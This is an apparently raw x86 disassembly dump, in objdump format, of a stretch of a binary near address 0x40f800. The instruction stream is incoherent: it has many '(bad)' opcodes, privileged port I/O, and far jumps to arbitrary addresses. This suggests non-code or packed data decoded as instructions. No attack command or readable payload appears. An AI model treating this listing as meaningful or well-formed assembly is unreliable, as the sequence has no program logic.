  40f7f3:	repnz mov WORD PTR [esi+0x5c],ss
	...
  40f83e:	add    BYTE PTR [ecx],dl
  40f840:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f841:	pop    esi
  40f842:	xor    eax,0xa57bfffe
  40f847:	int    0xa1
  40f849:	ficom  WORD PTR [ecx+edx*8-0x6c]
  40f84d:	jns    0x40f890
  40f84f:	(bad)  
  40f851:	add    BYTE PTR [eax],al
  40f853:	and    BYTE PTR [edi],al
  40f855:	add    BYTE PTR [eax],al
  40f857:	pop    ebx
  40f858:	int    0xb
  40f85a:	push   ebx
  40f85b:	ror    BYTE PTR [eax+eiz*4-0x7b],1
  40f85f:	xor    esp,edi
  40f861:	ror    DWORD PTR [esi-0x5a0bbf06],0x1e
  40f868:	push   edi
  40f869:	inc    edi
  40f86a:	adc    al,0x35
  40f86c:	aaa    
  40f86d:	sahf   
  40f86e:	inc    esi
  40f86f:	daa    
  40f870:	daa    
  40f871:	mov    al,0xd3
  40f873:	mov    cs:0xfc4f7d0b,al
  40f879:	call   0xa89919a4
  40f87e:	mov    bh,al
  40f880:	cmp    al,0xe4
  40f882:	xlat   BYTE PTR ds:[ebx]
  40f883:	hlt    
  40f884:	cwde   
  40f885:	mov    edx,0x926e84c7
  40f88a:	mov    ecx,0xc1f2ebc1
  40f88f:	adc    BYTE PTR [edx+0x6b3c13cf],dl
  40f895:	(bad)  
  40f897:	push   es
  40f898:	js     0x40f89e
  40f89a:	mov    DWORD PTR [edx+0x3d],ecx
  40f89d:	push   cs
  40f89e:	mov    esp,ecx
  40f8a0:	in     al,dx
  40f8a1:	push   es
  40f8a2:	(bad)  
  40f8a3:	imul   ebx,DWORD PTR [ecx],0xb552b9b2
  40f8a9:	jp     0x40f8b3
  40f8ab:	ret    
  40f8ac:	jg     0x40f848
  40f8ae:	adc    edx,DWORD PTR [edi]
  40f8b0:	imul   BYTE PTR [edx+0x624af3bc]
  40f8b6:	push   ss
  40f8b7:	add    esi,0xffffffd0
  40f8ba:	aad    0xb7
  40f8bc:	aaa    
  40f8bd:	fnsave [esi+edx*8]
  40f8c0:	jb     0x40f928
  40f8c2:	sbb    BYTE PTR [esi-0x153bee6a],bh
  40f8c8:	ins    DWORD PTR es:[edi],dx
  40f8c9:	jb     0x40f8a3
  40f8cb:	xor    ah,BYTE PTR [edi]
  40f8cd:	jbe    0x40f8da
  40f8cf:	je     0x40f8cb
  40f8d1:	adc    DWORD PTR cs:[ecx+0x62],0x93211610
  40f8d9:	or     edi,ebx
  40f8db:	loopne 0x40f878
  40f8dd:	add    cl,BYTE PTR [edi+0x3c]
  40f8e0:	arpl   WORD PTR ds:0x7e01f09f,dx
  40f8e6:	jne    0x40f901
  40f8e8:	popf   
  40f8e9:	or     ebp,esi
  40f8eb:	xchg   ebp,eax
  40f8ec:	jl     0x40f8ae
  40f8ee:	mov    bh,0xb
  40f8f0:	xchg   ebp,eax
  40f8f1:	add    al,0xb4
  40f8f3:	mov    cl,0x6a
  40f8f5:	pushf  
  40f8f6:	not    ebp
  40f8f8:	sti    
  40f8f9:	cmp    BYTE PTR [eax],bl
  40f8fb:	lock cmp BYTE PTR [ecx-0x45],0x35
  40f900:	nop
  40f901:	push   ss
  40f902:	sahf   
  40f903:	scas   eax,DWORD PTR es:[edi]
  40f904:	popa   
  40f905:	or     BYTE PTR [edi-0x76],ah
  40f908:	sbb    DWORD PTR [edi-0x40acd908],ecx
  40f90e:	retf   
  40f90f:	lahf   
  40f910:	cwde   
  40f911:	pop    esp
  40f912:	cli    
  40f913:	jl     0x40f951
  40f915:	jae    0x40f899
  40f917:	ds mov ecx,0x928c3601
  40f91d:	inc    edx
  40f91e:	jns    0x40f97d
  40f920:	sbb    al,0x8
  40f922:	cmp    dl,bh
  40f924:	test   BYTE PTR [ebx-0x17],al
  40f927:	rcr    DWORD PTR [esi-0x4a],1
  40f92a:	shr    DWORD PTR [edi],1
  40f92c:	mov    al,ds:0x9f73e0b0
  40f931:	daa    
  40f932:	call   0xfe8b:0xf9516423
  40f939:	sbb    dl,BYTE PTR [edx]
  40f93b:	sbb    eax,DWORD PTR [ebp+0x545ec077]
  40f941:	icebp  
  40f942:	xchg   ebx,eax
  40f943:	cld    
  40f944:	jns    0x40f972
  40f946:	xor    DWORD PTR [esi-0x4fa65ea4],ecx
  40f94c:	jbe    0x40f912
  40f94e:	mov    ch,0xe2
  40f950:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f951:	lods   al,BYTE PTR ds:[esi]
  40f953:	pop    ebp
  40f954:	and    al,0x47
  40f956:	jge    0x40f989
  40f958:	bound  edi,QWORD PTR [edx]
  40f95a:	dec    edi
  40f95b:	adc    BYTE PTR [edi-0x633a61d5],al
  40f961:	loope  0x40f972
  40f963:	push   edi
  40f964:	and    BYTE PTR [esi-0xac3e5aa],bh
  40f96a:	sbb    ebx,DWORD PTR [eax-0x31]
  40f96d:	lds    esi,FWORD PTR [ecx-0x1bdc2955]
  40f973:	push   0x22
  40f975:	jbe    0x40f9f3
  40f977:	mov    DWORD PTR [esp],ebx
  40f97a:	xor    BYTE PTR ds:0xc6b4c608,bl
  40f980:	retf   
  40f981:	mov    ah,0xfb
  40f983:	loopne 0x40f951
  40f985:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f986:	sbb    bh,BYTE PTR [ebx-0x7f7d3b4c]
  40f98c:	cwde   
  40f98d:	xchg   edx,eax
  40f98e:	sbb    eax,0xd64f9caa
  40f993:	leave  
  40f994:	add    al,0x85
  40f996:	jecxz  0x40f9e8
  40f998:	lahf   
  40f999:	and    BYTE PTR [ecx+0x78],0x3d
  40f99d:	pop    ss
  40f99e:	aas    
  40f99f:	je     0x40f96f
  40f9a1:	popf   
  40f9a2:	stc    
  40f9a3:	lahf   
  40f9a4:	retf   
  40f9a5:	fmulp  st(3),st
  40f9a7:	idiv   BYTE PTR [edx+0x363c0546]
  40f9ad:	mov    ds:0x105a0f28,eax
  40f9b2:	scas   eax,DWORD PTR es:[edi]
  40f9b3:	adc    sp,WORD PTR [edi-0xcf7f817]
  40f9ba:	in     eax,0x6c
  40f9bc:	ja     0x40fa3c
  40f9be:	pop    edi
  40f9bf:	(bad)  [esi+0x4a]
  40f9c2:	pusha  
  40f9c3:	jge    0x40fa3e
  40f9c5:	and    dl,BYTE PTR [edi+esi*8]
  40f9c8:	sbb    BYTE PTR [edx-0x10e0761e],ch
  40f9ce:	ficom  WORD PTR [edi+0x5c860de4]
  40f9d4:	loop   0x40fa1e
  40f9d6:	(bad)  
  40f9d7:	shr    BYTE PTR [ebx-0x1889c5e7],1
  40f9dd:	js     0x40f9fc
  40f9df:	xchg   bh,bl
  40f9e1:	or     ebx,DWORD PTR [eax-0x36]
  40f9e4:	mov    bl,0xc2
  40f9e6:	rcl    DWORD PTR [ecx+0x27],cl
  40f9e9:	or     al,0xc4
  40f9eb:	lea    esi,[eax-0x23]
  40f9ee:	push   cs
  40f9ef:	xchg   BYTE PTR [esi+ebp*4-0xcfff935],bl
  40f9f6:	sar    dl,0x52
  40f9f9:	inc    edi
  40f9fb:	pop    ds
  40f9fc:	cli    
  40f9fd:	hlt    
  40f9fe:	jp     0x40fa02
  40fa00:	add    edi,esi
  40fa02:	loop   0x40f9fb
  40fa04:	clc    
  40fa05:	add    eax,0x9603dcdb
  40fa0a:	xchg   ebp,eax
  40fa0b:	std    
  40fa0c:	push   esi
  40fa0d:	ficom  DWORD PTR [ebx-0x16]
  40fa10:	sub    al,dh
  40fa12:	add    BYTE PTR [esi+0x601c0e4b],0xff
  40fa19:	and    BYTE PTR [edx],ch
  40fa1b:	cmp    eax,0xa437e2b1
  40fa20:	push   edi
  40fa21:	add    dl,BYTE PTR [ebx-0x17345a65]
  40fa27:	mov    gs,eax
  40fa29:	aad    0xbe
  40fa2b:	xor    bl,bl
  40fa2d:	jnp    0x40f9d1
  40fa2f:	add    al,0xda
  40fa31:	sub    edx,DWORD PTR [edi]
  40fa33:	test   BYTE PTR [ebx-0x5bd98f55],al
  40fa39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa3a:	jge    0x40fa45
  40fa3c:	pop    ecx
  40fa3d:	jne    0x40fa31
  40fa3f:	loope  0x40f9cf
  40fa41:	icebp  
  40fa42:	(bad)  
  40fa43:	sbb    ch,dl
  40fa45:	std    
  40fa46:	push   0x9be728fb
  40fa4b:	sbb    ah,BYTE PTR [esi-0x3c358caf]
  40fa51:	enter  0xde9c,0xd9
  40fa55:	sbb    DWORD PTR [ebp+0x56],eax
  40fa58:	out    dx,al
  40fa59:	clc    
  40fa5a:	mov    es,WORD PTR [edx+0x17ea490b]
  40fa60:	lds    eax,FWORD PTR [ebx+0x10789ea7]
  40fa66:	dec    eax
  40fa67:	mov    dh,0xaa
  40fa69:	add    al,0x37
  40fa6b:	scas   eax,DWORD PTR es:[edi]
  40fa6c:	push   cs
  40fa6d:	mov    edi,0xe9302e4
  40fa72:	lea    ebx,[ebx+0x34]
  40fa75:	cld    
  40fa76:	cmp    edx,DWORD PTR [edx-0x52]
  40fa79:	mov    ch,0x50
  40fa7b:	es adc dh,al
  40fa7e:	repz aas 
  40fa80:	and    ebx,edx
  40fa82:	test   DWORD PTR [edi-0x632a13f4],esi
  40fa88:	nop
  40fa89:	push   edi
  40fa8a:	adc    DWORD PTR [ecx+0x69ae75ef],0xffffffe3
  40fa91:	outs   dx,DWORD PTR ds:[esi]
  40fa92:	adc    al,0x3d
  40fa94:	mov    bl,0x6
  40fa97:	adc    DWORD PTR [ecx+0x61981da1],0xffffff99
  40fa9e:	push   es
  40fa9f:	imul   ebp,DWORD PTR [ebp-0x62f9121c],0x92449ef3
  40faa9:	xor    edx,ebx
  40faab:	jns    0x40faf9
  40faad:	mov    eax,0xa014485a
  40fab2:	push   edx
  40fab3:	fmul   DWORD PTR [eax]
  40fab5:	shl    DWORD PTR [esi],0x42
  40fab8:	bound  ebp,QWORD PTR [eax+eax*8+0x22]
  40fabc:	jo     0x40facc
  40fabe:	mov    edi,0xa71f7bfb
  40fac3:	lods   eax,DWORD PTR ds:[esi]
  40fac4:	sub    ah,BYTE PTR [esi]
  40fac6:	rcr    BYTE PTR [ebx],cl
  40fac8:	ins    DWORD PTR es:[edi],dx
  40fac9:	and    eax,0xd20f462f
  40face:	jae    0x40fb3f
  40fad0:	xor    dl,0x7
  40fad3:	pop    edx
  40fad4:	jmp    0x5b5c:0x89fbddc
  40fadb:	adc    DWORD PTR [esi+0x39],eax
  40fade:	mov    dl,BYTE PTR [edi+0x7d]
  40fae1:	mov    ebp,DWORD PTR [ecx-0x42]
  40fae4:	and    BYTE PTR [ebx+0x59f33c32],bl
  40faea:	outs   dx,BYTE PTR ds:[esi]
  40faeb:	mov    bh,0x74
  40faed:	fisubr DWORD PTR [ebp-0x572c14ec]
  40faf3:	ja     0x40fb6c
  40faf5:	js     0x40fb3e
  40faf7:	int    0x39
  40faf9:	pop    esi
  40fafa:	pop    ecx
  40fafb:	dec    ebp
  40fafc:	jle    0x40fa8f
  40fafe:	mov    esp,0xe7dae7b3
  40fb03:	xor    dh,dl
  40fb05:	jne    0x40fab9
  40fb07:	cmp    esp,esp
  40fb09:	mov    esp,0xd0342158
  40fb0e:	or     bl,BYTE PTR [edx]
  40fb10:	pusha  
  40fb11:	dec    esp
  40fb12:	sti    
  40fb13:	call   0x282a:0xdf64a7e2
  40fb1a:	fisub  DWORD PTR [ebp-0x2a]
  40fb1d:	shr    BYTE PTR [ecx+0x90b9a63],1
  40fb23:	inc    edi
  40fb24:	add    eax,0xd5029c3d
  40fb29:	xchg   esi,eax
  40fb2a:	shld   DWORD PTR [edi-0x46d463ac],ebp,cl
  40fb31:	push   cs
  40fb32:	sbb    dl,BYTE PTR [bp+di+0x626c]
  40fb37:	mov    edi,0xbe61e58c
  40fb3c:	aas    
  40fb3d:	and    esp,ebx
  40fb3f:	fcomp  QWORD PTR [edi+eiz*8-0x1c]
  40fb43:	sub    eax,DWORD PTR [ebp+0x5e6b97bb]
  40fb49:	fs dec edx
  40fb4b:	adc    al,0x2f
  40fb4d:	(bad)  
  40fb4e:	or     BYTE PTR [ebp-0x9],cl
  40fb51:	jge    0x40fb06
  40fb53:	ret    
  40fb54:	enter  0x55d8,0x94
  40fb58:	dec    ebp
  40fb59:	cli    
  40fb5a:	xchg   ebp,eax
  40fb5b:	fld    DWORD PTR [ebx]
  40fb5d:	adc    ah,BYTE PTR [edi]
  40fb5f:	inc    ebx
  40fb60:	mov    edx,0x4cb897ab
  40fb65:	dec    edi
  40fb66:	mov    cl,ah
  40fb68:	push   ebp
  40fb69:	xchg   edi,eax
  40fb6a:	or     cl,BYTE PTR [ecx]
  40fb6c:	lahf   
  40fb6d:	mov    bh,0x9c
  40fb6f:	ret    
  40fb70:	xchg   esi,eax
  40fb71:	xchg   esp,eax
  40fb72:	dec    eax
  40fb73:	cmc    
  40fb74:	ins    BYTE PTR es:[edi],dx
  40fb75:	repnz cmp eax,0xbade1793
  40fb7b:	cli    
  40fb7c:	jl     0x40fbf5
  40fb7e:	dec    esi
  40fb7f:	fld    DWORD PTR [esi+0x48224a2d]
  40fb85:	mov    ds:0x9fd613b6,eax
  40fb8a:	fucomi st,st(6)
  40fb8c:	aas    
  40fb8d:	jno    0x40fbc9
  40fb8f:	or     bl,bl
  40fb91:	and    DWORD PTR [edi-0x1a],esp
  40fb94:	outs   dx,DWORD PTR ds:[esi]
  40fb95:	mov    esi,0x9328ba14
  40fb9a:	sbb    al,0x81
  40fb9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb9d:	lods   eax,DWORD PTR ds:[esi]
  40fb9e:	sbb    dh,BYTE PTR [edx]
  40fba0:	hlt    
  40fba1:	popf   
  40fba2:	add    al,BYTE PTR [edx-0x6f522f48]
  40fba8:	ret    
  40fba9:	(bad)  
  40fbab:	add    DWORD PTR [esi-0x2fbe9c03],esi
  40fbb1:	mov    ebp,0x330745d
  40fbb6:	mov    eax,0xe4426e7b
  40fbbb:	fistp  DWORD PTR [ecx-0x65]
  40fbbe:	ret    
  40fbbf:	push   edx
  40fbc0:	(bad)  
  40fbc1:	push   esi
  40fbc2:	ins    BYTE PTR es:[edi],dx
  40fbc3:	hlt    
  40fbc4:	aaa    
  40fbc5:	scas   al,BYTE PTR es:[edi]
  40fbc6:	stc    
  40fbc7:	or     ebx,edi
  40fbc9:	pop    ecx
  40fbca:	pop    ss
  40fbcb:	jb     0x40fb66
  40fbcd:	fstp   TBYTE PTR [ebx+0x42]
  40fbd0:	and    eax,0xdfa70ad0
  40fbd5:	retf   0x6e91
  40fbd8:	or     DWORD PTR [ebx-0x2b],ebx
  40fbdb:	pop    esp
  40fbdc:	loope  0x40fc33
  40fbde:	push   ebp
  40fbdf:	(bad)  
  40fbe0:	sub    BYTE PTR [esi+eax*4],ah
  40fbe3:	add    eax,0x5b746822
  40fbe8:	ins    BYTE PTR es:[edi],dx
  40fbe9:	outs   dx,DWORD PTR ds:[esi]
  40fbea:	cwde   
  40fbeb:	push   ecx
  40fbec:	dec    ebp
  40fbed:	mov    edx,0x19a5c9b3
  40fbf2:	shl    BYTE PTR [eax],cl
  40fbf4:	sub    cl,dh
  40fbf6:	or     ebx,ebp
  40fbf8:	sub    eax,DWORD PTR [esi+0x2c]
  40fbfb:	sahf   
  40fbfc:	sbb    dl,BYTE PTR [eax]
  40fbfe:	pop    esp
  40fbff:	lods   al,BYTE PTR ds:[esi]
  40fc00:	fwait
  40fc01:	sbb    eax,0x9976107d
  40fc06:	arpl   bx,dx
  40fc08:	inc    edi
  40fc09:	cmc    
  40fc0a:	aaa    
  40fc0b:	mov    ds:0x7b554c7e,eax
  40fc10:	pop    edx
  40fc11:	inc    ecx
  40fc12:	cs cmc 
  40fc14:	or     eax,0xb2d85883
  40fc19:	fbld   TBYTE PTR [ebx]
  40fc1b:	jo     0x40fc9c
  40fc1d:	sbb    bl,BYTE PTR [eax]
  40fc1f:	pushf  
  40fc20:	cmp    al,0xdb
  40fc22:	xchg   ebp,eax
  40fc23:	sub    DWORD PTR [ecx],edx
  40fc25:	div    DWORD PTR [edi]
  40fc27:	call   0x3178db2d
  40fc2c:	sub    esp,DWORD PTR [ebx-0x72d5ae9c]
  40fc32:	leave  
  40fc33:	xchg   edi,eax
  40fc34:	sub    al,0x44
  40fc36:	sahf   
  40fc37:	pop    ss
  40fc38:	pop    es
  40fc39:	add    eax,0x6b6e0d44
  40fc3e:	shr    DWORD PTR [ecx-0x3a],0x27
  40fc42:	jmp    0xc67da868
  40fc47:	jbe    0x40fbef
  40fc49:	inc    edx
  40fc4a:	xlat   BYTE PTR ds:[ebx]
  40fc4b:	push   edi
  40fc4c:	xchg   ecx,eax
  40fc4d:	and    eax,0x507cc924
  40fc52:	stc    
  40fc53:	jbe    0x40fc09
  40fc55:	adc    ebp,DWORD PTR fs:[edi+0x72f20cb3]
  40fc5c:	out    0x36,eax
  40fc5e:	addr16 ja 0x40fcd7
  40fc61:	xor    bh,BYTE PTR [ecx+0x61]
  40fc64:	imul   edx,DWORD PTR [esi-0x9119573],0x3e3990d0
  40fc6e:	push   esi
  40fc6f:	jp     0x40fc48
  40fc71:	jns    0x40fca4
  40fc73:	sub    ebp,ebp
  40fc75:	dec    esi
  40fc76:	popf   
  40fc77:	xor    ch,BYTE PTR [edx-0x31886094]
  40fc7d:	gs cmp edx,edi
  40fc80:	mov    dl,0x89
  40fc82:	lods   al,BYTE PTR ds:[esi]
  40fc83:	inc    edi
  40fc84:	inc    eax
  40fc85:	cmp    al,0x58
  40fc87:	data16 ds aad 0xe6
  40fc8b:	in     al,0x93
  40fc8d:	inc    edx
  40fc8e:	mov    esi,0x877e27c0
  40fc93:	mov    ecx,0x969592bd
  40fc98:	cmc    
  40fc99:	and    BYTE PTR [ebx+0x2b],ch
  40fc9c:	or     BYTE PTR [eax+0x4050f95f],dl
  40fca2:	jns    0x40fcef
  40fca4:	mov    esp,0x5328eee
  40fca9:	dec    ebx
  40fcaa:	and    BYTE PTR [edx-0x4a73150f],0x36
  40fcb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fcb2:	xchg   ecx,eax
  40fcb3:	aaa    
  40fcb4:	stos   DWORD PTR es:[edi],eax
  40fcb5:	jmp    0x3f1a:0xea3deb57
  40fcbc:	(bad)  
  40fcbd:	imul   ebx,DWORD PTR [edx+0x5f3cb4d8],0x28
  40fcc4:	jl     0x40fc6a
  40fcc6:	je     0x40fc90
  40fcc8:	mov    dl,0xe3
  40fcca:	mov    cl,0x49
  40fccc:	js     0x40fc70
  40fcce:	pop    es
  40fccf:	(bad)  
  40fcd0:	pop    ds
  40fcd1:	das    
  40fcd2:	ds push esp
  40fcd4:	mov    esp,0x9f7e67c
  40fcd9:	sub    dh,BYTE PTR [ebp-0x73c70f4d]
  40fcdf:	adc    bh,BYTE PTR [edx+0x69983938]
  40fce5:	add    al,0x1b
  40fce7:	call   0xcb72:0x2ce43d43
  40fcee:	dec    edi
  40fcef:	jge    0x40fd22
  40fcf1:	ins    BYTE PTR es:[edi],dx
  40fcf2:	pop    esp
  40fcf3:	mov    ch,0xda
  40fcf5:	stos   DWORD PTR es:[edi],eax
  40fcf6:	push   0xffffffa9
  40fcf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcf9:	xor    ebp,DWORD PTR [esi+edx*1-0x2e374703]
  40fd00:	fs and eax,0x3065af25
  40fd06:	mov    eax,0xfdb99ab9
  40fd0b:	aad    0xa9
  40fd0d:	push   edi
  40fd0e:	push   ecx
  40fd0f:	loope  0x40fd78
  40fd11:	push   0x799202a3
  40fd16:	mov    dl,0xab
  40fd18:	mov    ecx,0x84577698
  40fd1d:	fcmove st,st(4)
  40fd1f:	xor    eax,0x2951f48d
  40fd24:	jbe    0x40fd82
  40fd26:	test   eax,0x66279a77
  40fd2b:	and    BYTE PTR [edi-0x34],0x28
  40fd2f:	retf   
  40fd30:	xchg   ecx,eax
  40fd31:	lods   al,BYTE PTR ds:[esi]
  40fd32:	add    al,bh
  40fd34:	xor    al,0x2a
  40fd36:	push   esp
  40fd37:	ror    BYTE PTR [eax],1
  40fd39:	push   ecx
  40fd3a:	xor    eax,0xf8b9972f
  40fd3f:	cld    
  40fd40:	dec    edx
  40fd41:	dec    ebp
  40fd42:	fs repz retf 0x1f93
  40fd47:	jne    0x40fd88
  40fd49:	ss ds mov ecx,0xaa82eb12
  40fd50:	add    esp,esp
  40fd52:	neg    DWORD PTR [edx-0x53]
  40fd55:	leave  
  40fd56:	in     al,0xd9
  40fd58:	or     BYTE PTR [edx+0x19727888],0x9d
  40fd5f:	imul   ebx,DWORD PTR [edi+0x8],0x46feb203
  40fd66:	pop    es
  40fd67:	sbb    ebp,esi
  40fd69:	cmp    esi,edx
  40fd6b:	mov    esi,0xc23ee634
  40fd70:	inc    eax
  40fd71:	pop    ecx
  40fd72:	retf   
  40fd73:	or     edi,esi
  40fd75:	mov    esp,0x30c131c0
  40fd7a:	or     eax,0xeb96d767
  40fd7f:	shrd   DWORD PTR [esi],ecx,0xe0
  40fd83:	jp     0x40fde9
  40fd85:	(bad)  
  40fd86:	mov    edx,0x10c4d46b
  40fd8b:	imul   esi,DWORD PTR [ecx],0x43b85e1
  40fd91:	jo     0x40fd2b
  40fd93:	adc    eax,0x99b5cbda
  40fd98:	ja     0x40fd1b
  40fd9a:	cli    
  40fd9b:	sbb    al,0x21
  40fd9d:	scas   al,BYTE PTR es:[edi]
  40fd9e:	fnsave [edx]
  40fda0:	loopne 0x40fde0
  40fda2:	adc    BYTE PTR [edx],al
  40fda4:	adc    ecx,ebp
  40fda6:	inc    esp
  40fda7:	jbe    0x40fd82
  40fda9:	jl     0x40fd66
  40fdab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fdac:	pop    esp
  40fdad:	mov    ecx,0x73e20535
  40fdb2:	or     BYTE PTR [ecx],cl
  40fdb4:	aas    
  40fdb5:	imul   esp,DWORD PTR [edi],0xe446a5d6
  40fdbb:	dec    ebx
  40fdbc:	push   edi
  40fdbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fdbe:	cmp    DWORD PTR [ecx],eax
  40fdc0:	call   0x4b1f:0x69b6d29c
  40fdc7:	gs out 0xc4,eax
  40fdca:	push   esi
  40fdcb:	xchg   edi,eax
  40fdcc:	std    
  40fdcd:	mov    bh,0xf8
  40fdcf:	sub    DWORD PTR [edi+edi*2],esi
  40fdd2:	adc    ecx,0x83207ad8
  40fdd8:	jnp    0x40fe3d
  40fdda:	aaa    
  40fddb:	fwait
  40fddc:	(bad)  
  40fddd:	mov    edx,0x28ca0b7b
  40fde2:	or     al,0x21
  40fde4:	mov    es,WORD PTR [esi+0x48]
  40fde7:	add    DWORD PTR [edi+0x599be1f7],0xffffffbf
  40fdee:	or     DWORD PTR [edx+0x3f],0xfffffff7
  40fdf2:	fwait
  40fdf3:	adc    DWORD PTR [eax-0x4788fee1],esp
  40fdf9:	mov    ebp,0x71b93c5f
  40fdfe:	push   ebp
  40fdff:	into   
  40fe00:	inc    edi
  40fe01:	imul   eax,DWORD PTR [edx+0x74afbf54],0xffffffb9
  40fe08:	aam    0xa6
  40fe0a:	cs inc edi
  40fe0c:	xlat   BYTE PTR ds:[ebx]
  40fe0d:	test   al,0x68
  40fe0f:	and    ch,bh
  40fe11:	and    BYTE PTR [eax+0x76f1fbef],0x32
  40fe18:	push   ebp
  40fe19:	lea    edx,[ecx-0x66722bd7]
  40fe1f:	loope  0x40fdc7
  40fe21:	push   ebp
  40fe22:	ss push ebp
  40fe24:	inc    esi
  40fe25:	aaa    
  40fe26:	jnp    0x40fdcb
  40fe28:	xchg   edx,eax
  40fe29:	cmp    eax,0x132c551e
  40fe2e:	jecxz  0x40fdde
  40fe30:	mov    cl,0xe1
  40fe32:	mov    dh,0x63
  40fe34:	cmp    BYTE PTR [ecx+0x244714a],dl
  40fe3a:	xor    al,0x92
  40fe3c:	adc    al,0x18
  40fe3e:	jne    0x40fdd5
  40fe40:	lods   al,BYTE PTR ds:[esi]
  40fe41:	jp     0x40fdcf
  40fe43:	hlt    
  40fe44:	push   cs
  40fe45:	xor    si,dx
  40fe48:	and    BYTE PTR [esi+0x5e0224b8],dh
  40fe4e:	adc    eax,0xc9463132
  40fe53:	test   BYTE PTR [ebx-0x21],al
  40fe56:	mov    bl,0xad
  40fe58:	lea    esp,[eax+ebx*4-0x62]
  40fe5c:	pop    DWORD PTR [eax+0x90684f1]
  40fe62:	mov    bh,0xf3
  40fe64:	in     al,0x4c
  40fe66:	or     eax,0xf173ced4
  40fe6b:	jle    0x40fe66
  40fe6d:	fld    DWORD PTR [ebx-0x3d15d36a]
  40fe73:	mul    DWORD PTR [esi]
  40fe75:	aas    
  40fe76:	xchg   ebp,eax
  40fe77:	dec    edi
  40fe78:	inc    edx
  40fe79:	(bad)
  40fe7d:	clc    
  40fe7e:	call   0xcd29851
  40fe83:	scas   al,BYTE PTR es:[edi]
  40fe84:	mov    edx,0xb4a5d01d
  40fe89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe8a:	add    esp,DWORD PTR [ebx-0x7c]
  40fe8d:	aam    0xf3
  40fe8f:	xor    dh,ch
  40fe91:	sti    
  40fe92:	mov    esi,ecx
  40fe94:	je     0x40fefd
  40fe96:	(bad)  
  40fe97:	xchg   ebx,eax
  40fe98:	in     al,dx
  40fe99:	jmp    0xe1e0db31
  40fe9e:	jmp    0xbf12:0xe6de4c27
  40fea5:	cwde   
  40fea6:	inc    esp
  40fea7:	xchg   edi,eax
  40fea8:	les    ebp,FWORD PTR [edi+0x30]
  40feab:	in     eax,dx
  40feac:	mov    BYTE PTR [eax+eiz*8],0xeb
  40feb0:	xchg   edi,eax
  40feb1:	std    
  40feb2:	and    ch,ah
  40feb4:	push   ecx
  40feb5:	pushf  
  40feb6:	jnp    0x40fe70
  40feb8:	and    DWORD PTR [edx-0x669580d4],edi
  40febe:	pop    ss
  40febf:	repz xchg ecx,eax
  40fec1:	inc    eax
  40fec2:	and    bl,ch
  40fec4:	jno    0x40fee9
  40fec6:	aad    0xfd
  40fec8:	das    
  40fec9:	xchg   ebp,eax
  40feca:	loope  0x40fecf
  40fecc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fecd:	or     al,0xf9
  40fecf:	jbe    0x40ff33
  40fed1:	retf   0x32a5
  40fed4:	mov    edx,0x5e097f37
  40fed9:	inc    ecx
  40feda:	mov    ecx,0x5887c1aa
  40fedf:	cli    
  40fee0:	daa    
  40fee1:	cmp    DWORD PTR [ebp-0x5d510fc1],0x19142b0d
  40feeb:	mov    dh,0x5c
  40feed:	xor    esp,eax
  40feef:	(bad)  
  40fef0:	fbld   TBYTE PTR [eax+eax*2-0x3d02af5f]
  40fef7:	jns    0x40ff0a
  40fef9:	cld    
  40fefa:	and    DWORD PTR [esi+0x72],edi
  40fefd:	and    BYTE PTR ds:0x68af981a,0xdc
  40ff04:	add    al,0x25
  40ff06:	loope  0x40ff4a
  40ff08:	lds    esp,FWORD PTR fs:[ebp-0x15]
  40ff0c:	fsubr  DWORD PTR [eax]
  40ff0e:	sbb    al,0x8f
  40ff10:	mov    al,0xdf
  40ff12:	pop    esi
  40ff13:	inc    ebp
  40ff14:	loopne 0x40ff84
  40ff16:	xchg   DWORD PTR [ebp-0x51],esi
  40ff19:	jge    0x40fecd
  40ff1b:	adc    BYTE PTR [esi-0x352aa20d],bl
  40ff21:	jmp    0x8a44:0x92c1eb84
  40ff28:	sub    eax,0xe92e2709
  40ff2d:	mov    al,ds:0x113c97d2
  40ff32:	rol    BYTE PTR [esp+ebp*4-0x7e],0x33
  40ff37:	or     al,0xac
  40ff39:	add    eax,0xe1d88b7d
  40ff3e:	popf   
  40ff3f:	out    0x13,al
  40ff41:	sbb    eax,eax
  40ff43:	enter  0x4e82,0xa5
  40ff47:	(bad)  
  40ff48:	push   0x3921cedd
  40ff4d:	or     eax,DWORD PTR [edi-0x7]
  40ff50:	stos   DWORD PTR es:[edi],eax
  40ff51:	adc    edi,ebp
  40ff53:	out    0x57,eax
  40ff55:	push   edx
  40ff56:	sub    ah,bh
  40ff58:	xchg   esi,eax
  40ff59:	add    BYTE PTR [ebp-0x5c],ch
  40ff5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff5d:	loopne 0x40ff0f
  40ff5f:	pop    eax
  40ff60:	je     0x40ff43
  40ff62:	add    ch,dl
  40ff64:	mov    ah,0x79
  40ff66:	in     eax,dx
  40ff67:	in     al,0x94
  40ff69:	sub    edi,esi
  40ff6b:	pop    esp
  40ff6c:	(bad)  
  40ff6d:	mov    edx,0xedf0d1b5
  40ff72:	into   
  40ff73:	icebp  
  40ff74:	ja     0x40ffd3
  40ff76:	inc    esp
	...
  40ffbf:	outs   dx,DWORD PTR ds:[esi]
  40ffc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ffc1:	daa    
  40ffc2:	jbe    0x40ffb3
  40ffc4:	idiv   DWORD PTR [edi-0x43]
  40ffc7:	mov    ecx,0x2016f8af
  40ffcc:	div    DWORD PTR [edx]
  40ffce:	outs   dx,DWORD PTR ds:[esi]
  40ffcf:	sti    
  40ffd0:	add    al,0x1
  40ffd2:	add    BYTE PTR [eax],ah
  40ffd4:	pop    es
  40ffd5:	add    BYTE PTR [eax],al
  40ffd7:	cmp    BYTE PTR [ebp-0x31],ch
  40ffda:	jo     0x41002b
  40ffdc:	or     dl,ah
  40ffde:	xchg   ebp,ebp
  40ffe0:	jmp    0x410032
  40ffe2:	gs push esp
